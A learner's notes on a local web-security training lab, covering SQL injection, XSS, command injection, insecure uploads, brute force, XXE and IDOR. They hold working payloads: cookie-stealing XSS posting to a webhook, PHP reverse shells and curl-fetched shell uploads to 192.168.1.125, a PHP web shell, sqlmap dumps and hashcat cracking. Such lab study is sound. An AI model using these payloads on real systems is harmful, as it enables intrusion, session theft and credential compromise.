## Finding and Exploitation of common web vulnerabilities

### üîµ PEH Docker lab setup and usage instructions:

    apt update
    apt upgrade
    apt install docker.io
    apt install docker-compose
if no running docker daemon then start it (assuming we have docker io / docker compose installed)

check status:  

    systemctl status docker  
start docker:  

    systemctl start docker (if required)
    docker-compose up
stop container:  

    ctrl c  
have docker run in the background use -d for detached mode:  
    
    docker-compose -d
to check what dockers are running:  
    
    docker ps -a  
to stop:

    docker-compose stop
to remove a container, look for container ID and remove:

    docker rm 02dfB1w20cdcd11ee
to remove all containers:

    docker -rm $(sudo docker ps -aq)

to reset the instance from browser when docker instances are live:

    localhost/init.php

#### Once PEH docker is installed, with ./permission.sh file set, run localhost from burpe browser.

---

### üî¥ SQL Injection - Introduction Injection 0x01:

#### Lab 0x01 UNION 

User search: jeremy presents username and email fields  
![image](https://github.com/user-attachments/assets/ff8b811f-0322-46f2-80f7-2bb05f3518b3)

When probing a new site, firstly understand what the function is providing. Begin by probing with common inputs ', ' ', example', " ", "example"  

Then move on to using **logical operators**  
jeremy' or 1=1#  
jeremy' or 1=1-- -  

if successful move to using **union select** and figuring out the amount of null values required to return a response  
jeremy' union select null#  
jeremy' union select null,null,null#  

the third null respondes with results, indicating it has selected three coloumns in the background, loaded more information but only presenting two for us to see.  
![image](https://github.com/user-attachments/assets/45806752-eb2c-4640-81ed-0ad1e6a8389b)

jeremy' union select null,null,version()#  
![image](https://github.com/user-attachments/assets/8f0e98a3-6470-461a-a92d-295c4392b99a)

**Expanding this to look at the table names from the database**  
jeremy' union select null,null,table_name from information_schema.tables#  

**Expand this to look at the collumn names from the database**  
jeremy' union select null,null,column_name from information_schema.columns#

**Now to look for Jeremys or other password from this database, we need to identify the table (injection0x01) his details belongs to using the tables query**  

jeremy' union select null,null,password from injection0x01#
![image](https://github.com/user-attachments/assets/2a90862c-613b-4c97-a679-ffd62e8710e4)

**Note for intergers, in siutations such as user has an ID - Rare, may need to look into this more**  
jeremy' union select null(int),null,null from injection0x01#  

for example we may require the usage below to work with some queries  
jeremy' union select username,1,passwords from injection0x01#  

**Cheat Sheet PortSwigger website for different SQL injection databases**  
<https://portswigger.net/web-security/sql-injection/cheat-sheet>  

---

### üî¥ SQL Injection - Blind Part 1 Injection 0x02:  

#### Lab 0x02 BLIND INJECTION  
Testing the behaviour of the application.  

* Target: adding the target url to reduce noise  
* Proxy/HTTP history: to view request and response  
* Repeater: send captured Request or Response traffic to view and manipulate. Items to look out for: Cookies, Content Length  

![image](https://github.com/user-attachments/assets/ce2c8585-3af9-41a2-aa8d-038d95f1e5ae)

#### Probe  
Here we attempt basic SQL changes in the POST:request data by probing the username section with url encoded jeremy' or 1=1# and testing it with other common formats, whilst also checking if the response content-length changes to a succesful one.  

#### SQLMAP (to help look for wins)  
After multiple failed attempts, we can move to a tool called sqlmap. From the clean Repeater:Request window with the working credentials. Copy and paste into a .txt file.  

![image](https://github.com/user-attachments/assets/d6f2b0f6-222b-476e-8e37-1886b81bcf91)  

    sqlmap -r sqltraining.txt

![image](https://github.com/user-attachments/assets/11632c30-c902-4740-9560-999972de3349)  

it looks like nothing from this captured POST request can be exploited based from these checks.

#### Check for other injections points  
After the POST:request is sent, we notice there is a GET:request containing cookies. This means it also has to be processed as well by the application. Taking note of the 'content length' of a successful Request, we can begin checking basic SQL injection queries with the cookie.  

![image](https://github.com/user-attachments/assets/88ab0d83-9b46-4846-ad32-86f7662fead8)

Here we have sucessfully manupilated the cookie section by injecting SQL into it, indicating this area is vulnerable.

### üî¥ SQL Injection - Blind Part 2 Injection 0x02: 

#### Lab 0x02 BLIND INJECTION  
We have now identified a Blind SQL injection, because the query is only changing the behaviour of the application. I.E the content-length or 'welcome' message when query is true. And through this we are able to exploit this behaviour to slowly extract data via True or False queries.  

#### üî® MANUAL Probe with SUBSTRING(string, start, length) <https://www.w3schools.com/jsref/jsref_substring.asp>  
From the manipulated query we can slowly extract data via adding substrings into the query. As seen below, 'a' is 1st of 1 length = 'a', if true it will return a positive content-length.
![image](https://github.com/user-attachments/assets/386375e9-3e35-4f88-9fd6-135b5c16d19a)  

'alex' is 1st of 3 length = 'ale'  
![image](https://github.com/user-attachments/assets/2e3add93-4bab-474c-9dfe-7d99f0313895)  

Extracting the SQL database version, by slowly iterating the length upwards as the version numbers match.  
![image](https://github.com/user-attachments/assets/7617e57e-4eef-47e3-a438-a549043a2d87)  

Exercise: Extracting the password for jessamy via blind injection is very manual, so therefore we will send it to Intruder to conduct a sniper attack  
![image](https://github.com/user-attachments/assets/fdb58a23-f339-4d8d-9b3d-8a7bda91eae3)  

Exercise: In intruder we have set our 'payload position' and custom payload configuration of strings to test in the selected position  
![image](https://github.com/user-attachments/assets/47ca1cae-0ace-49e9-8ad2-76d57c923110)  

Exercise: Here we find a unique length response paired with the Response recieved with a content-length:1027. Suggseting the character z exists. 
![image](https://github.com/user-attachments/assets/ab7bbb72-4b3f-4ffb-8057-3a38f20355c6)  

---

#### ‚öíÔ∏è AUTOMATIC Probe with SQLMAP  

Grabbing the original GET request, we store it into a .txt file to be sacnned with 'sqlmap -r file.txt --level=2'  
![image](https://github.com/user-attachments/assets/6f72fcd0-2a69-4f8b-b2e5-df3518d3ad37)  

sqlmap -r file.txt --level=2> N encoding > Y Skip other payloads for other DBs Y > Y include level 1 and 2 risk one values > N Fuzzy test > N random integers > Y Null values > N other cookie sessions.  
![image](https://github.com/user-attachments/assets/85a05773-667b-4a59-988d-1948022b6f2b)  

sqlmap -r file.txt --level=2 --dump | identified md5 passwords hashes and performed a dictionary attack which cracked passwords from lab injection0x03 lol...  
![image](https://github.com/user-attachments/assets/0dff6d6c-e93e-4eb5-a0db-6757124a35ed)  

sqlmap -r file.txt --level=2 --dump -T injection0x02| for a faster -T scan of only the injection0x02 Table  
![image](https://github.com/user-attachments/assets/cf513f81-1da9-44ce-9869-6f8442000fae)  

---

### üî¥ SQL Injection - Challenge Injection 0x03:  
Table name examples: 
* injection0x03_products
* injection0x03_users

sucessfull content length: length25XX  
sucessfull content length: OR , AND 45XX  
unsuccessful content length: 17XX  

basic SQL injection attack: Yes  
Senpai Knife Set' OR 1=1# / Senpai Knife Set' AND 1=1#  

basic UNION attack: Yes  
union works
Senpai Knife Set' union select null,null,null,null#  

Version discoverey: Yes  
version() 8.0.41
Senpai Knife Set' union select null,null,null,version()#  

Table List: Yes  
list tables:
Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#  

Column list: Yes  
Senpai Knife Set' union select null,null,null,column_name from information_schema.columns#  

Found table named injection_0x03_users  
Password: Senpai Knife Set' union select null,null,null,password from injection0x03_users# | password: onigirigadaisuki  

Found username from injection_0x03_users  
Senpai Knife Set' union select null,null,null,username from injection0x03_users# | username: takeshi  

**problem solved.**  
**Personal Note:** finding the columns will determine what you can query in the tables.

Since we want to be more specific and we know the -T table we want:  
sqlmap -r sqltrain1.txt -T injection0x03_users --dump  

![image](https://github.com/user-attachments/assets/5e61d6f8-a8b3-40db-886f-705b923337f1)  

**Personal Note** ENSURE SYNTAX ARE ALL CORRECT / EVEN WHEN LEAVING OUT A SINGLE CHARACTER CAN MAKE THINGS NOT WORK.

---

## üîµ XSS Introduction  
A flexible vulnerability, that allows us to execute typical javascript or sometimes html in a victim browsers and lets us take control of that application. There are three types:
1. Reflected - script is included in a http request, you send a script and a response is return with the script.
2. Stored - payload is sent to a DB where it is stored and retrieved later.
3. DOM-Based - everything happens locally on the client side browser, where there is vulnerable java script that uses untrusted inputs.

**The purpose of javascript is that it programs the behaviour of web pages. By adding interactivity and dynamic behaviour in real-time manipulation of both html and css.**  

### üî¥ XSS 0x01 DOM LAB
When conducted on local host and there is no network connections (http) being made, this is considered a DOM based attack.  

**Basic test** - will not trigger unless it was added to the page prior to loading.

    <script>prompt(1)</script>

**Triger test** triggers an error by loading an img=x where there is no x it throws an error, this error is used to load jscript.

    <img src=x onerror=prompt(1)>

**Windows.alert()**  
    
    <img src=x onerror=window.alert(888)>

**Windows.location.href**  

    <img src=x onerror=window.location.href='https://tcm-sec.com'>
    
---

### üî¥ XSS 0x02 STORED LAB  
In a stored XSS attack, malicious scripts are sent and stored in the DB and executed at a later time.  

[download firefox containers]  
[download firefox cookie-editor]  

**HTML Test** We should always test for html injection, as it is more likely to work. To validate if it is trully stored, we can check in a different instance (browser) and see if the injection has made its way and was stored in the DB.  
    
    <h1>test</h1>
    
**Test for basic JS XSS** In this we store two different prompts to be executed when the page is loaded.  

    <script>prompt(1)</script>
    <img src=x onerror=prompt(1)
    
**Storing document.cookie in DB**  

    <script>alert(document.cookie)</script>

---

### üî¥ XSS 0x03 - Challenge invoke admin cookie and exfil

**Test if Admin cookie can be called**

    <script>alert(document.cookie)</script>

**Using Fetch API function in jscript to invoke admin cookie and also exfiltrate to domain of choice, in this case a custom webhook** - found in portswigger <https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies>  

    <script>
    fetch('https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>

![image](https://github.com/user-attachments/assets/b181e13e-efe5-4255-84dd-383253ed1136)

**Notes**  
initially i adopted to just grab the cookie presented from initial prompt and craft a secondary payload to POST cookie. However first payload is more efficient.

    <script>
    fetch('https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e', {
    method: 'POST',
    mode: 'no-cors',
    body:'cat323'
    });
    </script>

**Alternate version to invoke and exfil without using Fetch API function**  

    <script>
    var img = new Image();
    img.src = 'https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e?cookie=' + encodeURIComponent(document.cookie);
    </script>

---

## üîµ Command injection - Introduction  
A Command Injection attack occurs when an attacker is able to inject and execute arbitrary commands on a system, typically on the server-side, via a vulnerable web application. These commands are typically executed by the underlying operating system. Exploitng vulnerabilities in an application's input validation mechanisms.  

### üî¥ Command Injection 0x01 - Basics  
using <https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection> we can start by testing for simple injections with special characters ;, &&, ||, and |. Test for injection within command arguments.

    google.com
    google.com; whoami
    ;whoami;asd

We can view page soucre for a better view. Now that we know this field is vulnerable to an injection attack using ; we should attempt a reverse shell  

**Search for common tech**

    ;python3 -V;ssd | No Result
    ;python -V;sda | No Result
    ;which python;asd | No Result
    ;which python3;asd | No Result
    ;which php;sds | Result: /usr/local/bin/php
    ;which bash;dfs | Result: /bin/bash 

now that we have identified there is no python available, however php is available with /bin/bash we can try using the below with nc listening:  

    php -r '$sock=fsockopen("192.168.1.125",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    with injection characters;
    ;php -r '$sock=fsockopen("192.168.1.125",4444);exec("/bin/sh -i <&3 >&3 2>&3");';sdad

![image](https://github.com/user-attachments/assets/3a672593-cce6-4fff-bbf7-aa2891dd4251)  

Reverse shell obtained
![image](https://github.com/user-attachments/assets/5f05d602-159c-492f-be3d-07618222e1c1)  

---

### üî¥ Command Injection 0x02 - Blind / Out-of-Band  
Blind is when no response is 'reflected' back for us to see if an injection is sucessful or not. Out-if-band is when the response is collected outside of the application such as webhooks or listeners.  

**Basic tests**

    google.com | Response ok
    google.com; | Response ok however removed ;
    google.com ; whoami | Response okay however returned google.com whoami and removed ;

**At this point we have identified this to be a blind injection, lets test for out of bands to see if it returns a result**  
using a webhook, we add ?`` to the end of the webhook URL.  

    https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e?`whoami`

![image](https://github.com/user-attachments/assets/2080701a-0a36-4346-ac94-09d7bca3b981)

**Now that we know the backend system is vulnerable to injections and will process our commands, we should attempt to achieve a RevShell** 

we already know in this instance ; is filtered out however not other characters.  
lets test if we can input the accepted syntax og google.com and start a new line with \n with fresh new inputs to grab a malicious file hosted on our terminal. `google.com \n wget http://192.168.1.125:8080/working`

![image](https://github.com/user-attachments/assets/9b83866f-eb6b-4843-84ca-26745b9b3f1a)

Try to upload a .php RevShell using wget

    google.com \n wget http://192.168.1.125:8080/rs.php > /var/www/html/rs.php

wget did not work so lets try another method `&& curl`

    google.com && curl http://192.168.1.125:8080/rs.php > /var/www/html/rs.php

navigate to localhost/rs.php and reload, we get a RevShell back to terminal

![image](https://github.com/user-attachments/assets/b54b53f2-f725-437f-8173-383ac0b73b53)

---

### üî¥ Command Injection 0x03 - Challenge probe to get code execution or reverse shell  
In this challenge we can see that we are presented with the awk processing language.  
we need to undertand the behaviour, the output it is providing, learn the language / syntax, then test where we can inject malicious commands in the process path.  

successful injection to print test `232)^2)) ; print "test"}' #`

![image](https://github.com/user-attachments/assets/57bcf832-dbd2-432e-a458-b4cbdd5120cd)

successful injection to test whoami `232)^2)) ; system("whoami")}' #`

![image](https://github.com/user-attachments/assets/368c43fc-6b24-458f-91c8-c7d055e79d83)

testing wget and curl functionality with injection payload `232)^2)) ; system("curl http://192.168.1.125:8080/test")} #`. wget was not working so therefore used curl with success.  

![image](https://github.com/user-attachments/assets/343abf1d-fccb-4e77-ab29-5ccbf11b0667)

test file loaded. Initiating rs.php upload `232)^2)) ; system("curl http://192.168.1.125:8888/rs.php")} #`. RevShell loaded into localhost/rs.php. In future instances, if we are unable to call rs.php from a successful upload we should attempt to direct the upload to `/var/www/html` in this example it would be `232)^2)) ; system("curl http://192.168.1.125:8888/rs.php > /var/www/html/rs.php")} #`  

RevShell payload loaded with succesful call back from local.host/rs.php in browser

![image](https://github.com/user-attachments/assets/fa1d317b-908e-4c43-90aa-e18880c51fa8)

**üõ†Ô∏è Note: instead of uploading .php payload and executing it via localhost/rs.php, an attempt to directly input php reverse shell command into the injection to execute on the applicaiton command line could of been made first** 

In this example and second method of obtaining command injection. We could simply close off the first syntax argument and then initiate a secondary code execution by simply adding `; whoami ; #`

    232)^2)))}' ; whoami ; #

By achieving this we can simply close off the original argument and start a new reverse shell argument:

    232)^2)))}' ; php -r '$sock=fsockopen("192.168.1.125",8888);shell_exec("/bin/sh -i <&3 >&3 2>&3");' : #

![image](https://github.com/user-attachments/assets/302858f7-0e0e-457d-a8d9-82e62ad69129)

---

## üîµ Insecure File Upload - Introduction  
General objective, to achieve code execution after file upload. Secondary objective could be to override existing files and Third objective can be to create a denial of service to  the application.  

### üî¥ Insecure File Upload 0x01 - Basic Bypass  

understand what the application is doing.  

upload file test.txt > only jpg or png allowed  

opening dev tools to inspect networks, we see that no 'checks' are made on the server side and seems like everything is happening on the client side. Even if the check does happen, we have control over the client side and can possbily disable javascript so that the check never happens. Or we can intercept the request and change the file type that way.  

upload an image and intercept the request via Burp  

![image](https://github.com/user-attachments/assets/c07c3e7b-0fb1-4661-bf94-283786bb4287)  

![image](https://github.com/user-attachments/assets/d1e164f0-c5be-46f9-9a62-22385f970fe0)  

Send successful REQUEST to REPEATER and manipulate the file upload. Replace contents of PNG with text and filename== to test.txt and proceed to send and verify results.

Response code:200  
![image](https://github.com/user-attachments/assets/115fd2f8-1968-42a1-af6d-0b529e63b308)  

test.txt uploaded  
![image](https://github.com/user-attachments/assets/b4b45bde-29e5-4a3a-b419-2796aee625e6)

**Now that we know we can bypass the checks and upload other file types containing strings, we can look to uploading a `.php based webshell` command line argument to be executed via the application.**

modifying the content `<?php system($_GET['cmd']); ?>` we get status code 200  

![image](https://github.com/user-attachments/assets/0e4c37b8-3576-4ed3-86d8-c1395ebfd920)  

![image](https://github.com/user-attachments/assets/07387fae-dae7-447b-8555-ddffe076418e)  

Now that we have confirmed the cmd.php with our command has been loaded into the application, we now need to figure out where this is stored to trigger execution.  

ffuf to fuzz for potential directory:

    ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/dirb/common.txt  

![image](https://github.com/user-attachments/assets/0f30cb39-09af-4119-9efe-5910d697a819)  

we found 'labs' may be a potential, fuzz into labs

    ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt

![image](https://github.com/user-attachments/assets/0ae74450-c96e-493f-b353-bbc565086462)

testing the found directories and adding the cmd= input with command line syntax.

![image](https://github.com/user-attachments/assets/256357b8-2a77-4d45-bbd3-f92b55947a66)

---

### üî¥ Insecure File Upload 0x02 - Magic Bytes  
another method to bypass potential checks this time on the server side, we could attempt to exploit other insecure forms of validaiton. such as manipulating the file extension name `test.php.png` , `test.php%00.png` (null bytes to cancel out .png) are just one of many potential webapp exploits.  

Inserting malicious command within the body of a legitmate png file type and changing filename== to `test2.php`  

status code:200  
![image](https://github.com/user-attachments/assets/b416d0a1-ee5c-4bdb-b915-198806cfdfff)

successful upload of test2.php with `<?php system($_GET['cmd']); ?>` embedded within content  
![image](https://github.com/user-attachments/assets/e1cd8a71-5cea-4aec-b82f-dd9de6290db8)

succesful bypass and php command injection achieved  
![image](https://github.com/user-attachments/assets/322f918f-a6d8-4f5e-a9b0-fe06e777f452)

---

### üî¥ Insecure File Upload 0x03 - Challenge

Testing file uploads, shows only .jpg and .png allowed  

can upload embedded commands into .png  
![image](https://github.com/user-attachments/assets/0518fc91-c22d-4999-a0ec-b92d4dd96924)  

**finding .php vulnerability to execute:**  
.php can be added to file name for bypass as long as .png is in the file name for example `.php.png` allows file upload indicating potential vulnerabilities in file type checks. After multiple tries with version such as `.php.png`,`pHp`,`php5`,`php.%00.png` version were sucessfuly uploaded however did not perform code execution.

using `phtml`  
![image](https://github.com/user-attachments/assets/d9387da0-a5e7-4fd4-a601-c2adb49d9054)  

succesful in application code execution  
![image](https://github.com/user-attachments/assets/3edb06e2-07a2-4c3d-84a2-436696ded0e2)


**Note: If embedded magic bytes are accepted into file uploads, leverage from this vulnerability and find the file type that is accepted to bypass upload rail guards**

---

## üîµ Attacking Authentication - Introduction  

Authentication is who you are. Two main ways to attack are brute force and logic based issues.  

### üî¥ Attacking Authentication 0x01 - Brute Force  
using burp to brute force after sending a failed login request to intruder to repeat an attack with a wordlist payload.  
![image](https://github.com/user-attachments/assets/0ae14040-1062-4797-b4ab-3a9d19da0c1d)

using ffuf to brute force a configured .txt file containing the request. replace password with `FUZZ`.    
![image](https://github.com/user-attachments/assets/a58fdd0a-e084-4f39-813b-cbfa2190f03c)

    ffuf -request test.txt -request-proto http -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1814

![image](https://github.com/user-attachments/assets/3edcf2fd-5773-4766-a33c-c068d681c9eb)

---

### üî¥ Attacking MFA 0x02 - Brute Force
in this session we have username and password and when logged in, prompts us with a MFA which is provided in another instance.  

intercept the proxy when issuing the MFA and input username Jeremy to see if we can gain access into Jeremys account instead of Jessamy.  

Intercepted MFA POST request  
![image](https://github.com/user-attachments/assets/ae648be1-05e0-4398-9214-15ced7ddcb3c)  

Forward altered username with jessamys MFA code  
![image](https://github.com/user-attachments/assets/e0cd8c79-7ae7-4ae0-9c83-c390755aa3d3)  

![image](https://github.com/user-attachments/assets/5498cd44-c122-42f2-b30a-a9a350710c03)  

---

### üî¥ Attacking Authentication 0x03 - Challenge
Information discloure has potentially informed us admin or administrator may be usernames due to the information disclosure presented  
![image](https://github.com/user-attachments/assets/e4bb341f-f6b2-45a2-9a1a-889752aeb6c4)

after intercepting the `POST` request, we grab the request and insert it into a text file modifying the username and password fields with `USERFUZZ` and `PASSFUZZ`.  

Adding a text file containing potential users of admin and administrator (removed administrator) and directing it to be fuzzed with the xato wordlist, filtering out -fs response size of 3356 and only showing -ms 200 status code.

`ffuf -request test.txt -request-proto http -mode clusterbomb -w testusername.txt:USERFUZZ -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSFUZZ -mc 200 -fs 3356,3256`  

![image](https://github.com/user-attachments/assets/1adc6897-272e-4990-925e-ee46d008a199)  

**Note:**  
* reset DB for **EVERY** fresh new scan / brute force
* using ffuf to brute force was spot on, however login panel had to be reset after initial web testing as account lockout will render any terminal brute froce useless
* increased VM ram to 8bg as rockyou wordlist kept crashing with ffuf
* downloaded seclist wordlist and changed password lists to xato wordlist

Using Burpe (crappy) alternative in this event - Not that great without proffesional edition, with webapp also easily blocks attempts:  
1. Send request to intruder 
2. set payload positions 1 and 2 for username and password
3. Limited the username to only admin due to high confidence from information disclousure
4. run scan and monitor for interesting length results that may stand out

![image](https://github.com/user-attachments/assets/7cac9f9c-8a9a-481b-8549-1e36a21a8abf)

---

## üîµ XXE External Entities Injection - Introduction  
Some applications use XML to transfer data. The XML format may contain dangerious functions/features. XML external entities are custom entities that are outside the 'document' and therefore needs to be located as the XML file is parsed. These attacks exploit vulnerabilities in the way XML parsers handle external entities in XML documents which can be used to read files and achieve remote code execution.  

---

### üî¥ XXE XML Injection attack   
resources to help: PayloadsAllTheThings <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>  

Example of a malicious XML payload  
![image](https://github.com/user-attachments/assets/4ca2374f-256b-434e-bddb-dcbdbf97e413)

![image](https://github.com/user-attachments/assets/9ce78aa0-2035-4583-abb1-4e0d0048f114)

---

### üî¥ IDOR Insecure Direct Object Reference
Access control issue, where we can request a resource with an object ID returning some information.  

example: changing account in the url.  
![image](https://github.com/user-attachments/assets/4e572700-b387-4dfd-b5a7-c23cedddf5e1)

automating this process with a generated txt file with 1-2000 and then washing the url against it with ffuf

    ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w 1-2000.txt -fs 849 -v | grep FUZZ

![image](https://github.com/user-attachments/assets/197f2f01-8d36-46ce-b629-bac0d011b581)

---

### üî¥ Capstone Challenge

**subdomains** ffuf fuzzed `ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php -v | grep FUZZ` -e for extension to search for, in this case we want to look for php.

    * FUZZ: index
    * FUZZ: # on atleast 2 different hosts
    * FUZZ: # directory-list-2.3-medium.txt
    * FUZZ: #
    * FUZZ: # Suite 300, San Francisco, California, 94105, USA.
    * FUZZ: #
    * FUZZ: #
    * FUZZ: # This work is licensed under the Creative Commons 
    * FUZZ: # Copyright 2007 James Fisher
    * FUZZ: # Priority ordered case sensative list, where entries were found 
    * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this 
    * FUZZ: # license, visit http://creativecommons.org/licenses/by-sa/3.0/ 
    * FUZZ: # or send a letter to Creative Commons, 171 Second Street, 
    * FUZZ: #
    * FUZZ: db
    * FUZZ: logout
    * FUZZ: auth
    * FUZZ: coffee

* input validation blocked by \ when testing for SQL injection attacks
* vulnerabile to XSS `<script>prompt(1)</script>` and `<img src=x onerror=prompt(1)>` and `<img src=x onerror=window.alert(888)>`
* vulnerable to Stored attacks `<h1>test</h1>`
* vulnerable to cookie theft PHPSESSID=067e91cea0362b8f69ce119bb6792859 using `<script>alert(document.cookie)</script>`
* weak password requirement
* IDOR in url
* potentially suceptible to SQL injection in url `coffee=1' OR 1=1-- -` and `coffee=1' OR 1=1#`
* critical finding in coffee page `coffee=1' or 1=1-- -`
* critical finding in 7 null values for union select `localhost/capstone/coffee.php?coffee=1' union select null,null,null,null,null,null,null-- -`
* found union select to work on the 5th null value with 2nd null value to potentially contain "coffee names" `coffee=1' union select null,'string',null,null,null,null,null-- -`
* found out **table name** `coffee=1' union select null,table_name,null,null,null,null,null from information_schema.tables-- -`
* results presents a users table
* found out **column names** `coffee=1'union select null,column_name,null,null,null,null,null from information_schema.columns-- -`
* from the **coloumn names we have identified "username and password"** to be of interest we will attempt to **enumerate it in the "users" table**, lets attempt to enumerate it.
* from enumerating "username and password" from "users" table `coffee=1' union select null,username,password,null,null,null,null from users-- -` we have found a raft of user accounts. jeremy $2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy | jessamy $2y$10$meh2WXtPZgzZPZrjAmHi2ObKk6uXd2yZio7EB8t.MVuV1KwhWv6yS
* google type of hash starts with $2y$10$ = blowfish
* placed hashes in test.txt, identified hash type to be -m 3200 blowfish mode in hashcat.
* cracking hashes with `hashcat -m 3200 test.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt `
* password found and confirmed with login to be captain1 with jeremys hash $2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy

--- continue on from here ---

* perform sqlmap scan with captured page request
* dump sqlmap scan information
* work on a better .php enumeration and doulb enumeration of interesting domains
* use admin panel discovered via subdomain enumeration
* upload image and figure out where it may be contained
* upload insecure malicious file type containing .php command injection, to return results via editing the url from the resource location.
